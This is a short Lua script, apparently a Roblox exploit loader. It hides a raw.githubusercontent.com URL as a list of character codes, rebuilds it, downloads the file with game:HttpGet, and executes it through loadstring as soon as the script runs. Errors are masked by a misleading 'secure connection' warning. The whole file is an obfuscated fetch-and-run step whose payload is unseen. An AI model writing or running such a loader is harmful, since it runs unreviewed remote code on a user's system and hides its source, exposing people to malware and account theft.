local _0xRM8Data = {
    104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 
    117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 
    109, 47, 102, 107, 109, 109, 97, 105, 56, 50, 47, 90, 51, 109, 47, 114, 101, 
    102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47, 83, 111, 111, 110
}

local function _0xExecuteSecure()
    local _0xPayload = ""
    for _0xKey = 1, #_0xRM8Data do
        _0xPayload = _0xPayload .. string.char(_0xRM8Data[_0xKey])
    end
    
    local _0xStatus, _0xOutput = pcall(function()
        return loadstring(game:HttpGet(_0xPayload))()
    end)
    
    if not _0xStatus then
        warn("[RM8 Core Error]: Secure connection disrupted.")
    end
end

_0xExecuteSecure()
